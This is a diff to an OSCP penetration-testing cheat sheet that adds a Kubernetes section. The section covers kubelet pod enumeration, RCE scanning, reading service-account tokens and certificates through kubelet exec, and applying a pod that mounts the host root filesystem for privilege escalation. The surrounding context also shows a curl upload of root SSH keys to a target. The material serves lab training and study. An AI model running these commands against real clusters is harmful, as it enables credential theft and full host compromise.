@@ -29,6 +29,10 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [LinPEAS](#linpeas)
     - [pspy](#pspy)
+  - [Kubernetes](#kubernetes)
+    - [Enumerate pods (kubeletctl)](#enumerate-pods-kubeletctl)
+    - [Enumerate pods (kubectl)](#enumerate-pods-kubectl)
+    - [Scan pods vulnerable to RCE](#scan-pods-vulnerable-to-rce)
 - [Password Cracking](#password-cracking)
   - [hydra](#hydra)
       - [Example](#example)
@@ -153,6 +157,15 @@ This repository describes cheat sheet and knowledge for OSCP.
       - [exe-service](#exe-service)
 - [Nginx](#nginx)
   - [Malicious conf file to get root privilege](#malicious-conf-file-to-get-root-privilege)
+- [Kubernetes (k8s)](#kubernetes-k8s)
+  - [Get a list of pods](#get-a-list-of-pods)
+  - [Get token](#get-token)
+  - [Get certificate](#get-certificate)
+  - [Get a list of pods](#get-a-list-of-pods-1)
+  - [Get allowed operations on resources](#get-allowed-operations-on-resources)
+  - [Applying the image](#applying-the-image)
+    - [Example for yaml](#example-for-yaml)
+    - [applying the configuration and image](#applying-the-configuration-and-image)
 - [BurpSuite](#burpsuite)
   - [Hot Keys](#hot-keys)
 - [GraphQL](#graphql)
@@ -256,6 +269,24 @@ Monitoring process tool in real time.
 ```
 https://github.com/DominicBreuker/pspy
 ```
+## Kubernetes
+### Enumerate pods (kubeletctl)
+Kubeletctl is a command line tool that implement kubelet's API.
+https://github.com/cyberark/kubeletctl?tab=readme-ov-file
+```shell
+./kubeletctl_linux_amd64 --server $IP pods
+```
+
+### Enumerate pods (kubectl)
+```shell
+kubectl --token=$token --certificate-authority=ca.crt -server=https://$IP:8443 get pods
+```
+
+### Scan pods vulnerable to RCE
+```shell
+./kubeletctl_linux_amd64 --server $IP scan rce
+```
+
 
 # Password Cracking
 ## hydra
@@ -929,6 +960,72 @@ ssh-keygen
 curl -X PUT 10.129.230.87:1337/root/.ssh/authorized_keys --upload-file root.pub
 ssh -i root root@<target ip>
 ```
+
+# Kubernetes (k8s)
+## Get a list of pods
+The pods information are extracted from the following URL (kubelet).
+```
+https://$IP:10250/pods
+```
+
+## Get token
+Location of token:
+```
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+If the RCE vulnerability is existed, the token is obtained by:
+```shell
+kubeletctl --server $IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
+```
+Note that `nginx` is an example for k8s service.
+
+## Get certificate
+Location of cert
+```
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
+If the RCE vulnerability is existed, the certificate is obtained by:
+```shell
+kubeletctl --server $IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
+```
+Note that `nginx` is an example for k8s service.
+
+## Get a list of pods
+[Enumerate pods (kubectl)](#enumerate-pods-kubectl)
+
+## Get allowed operations on resources
+```shell
+kubectl --token=$token --certificate-authority=ca.crt -server=http://$IP:8443 auth can-i --list
+```
+## Applying the image
+### Example for yaml
+This example is applying nginx and mouted in `/mnt`.
+Ref: https://hackthur.medium.com/htb-steamcloud-writeup-3eab1049daf2
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: arthur-pod
+  namespace: default
+spec:
+  containers:
+  - name: arthur-pod
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /mnt
+      name: arthur-privesc
+  volumes:
+  - name: arthur-privesc
+    hostPath:
+      path: /
+```
+
+### applying the configuration and image
+```shell
+kubectl --token=$token --certificate-authority=ca.crt -server=https://$IP:8443 apply -f f.yaml
+```
+
 
 # BurpSuite
 ## Hot Keys
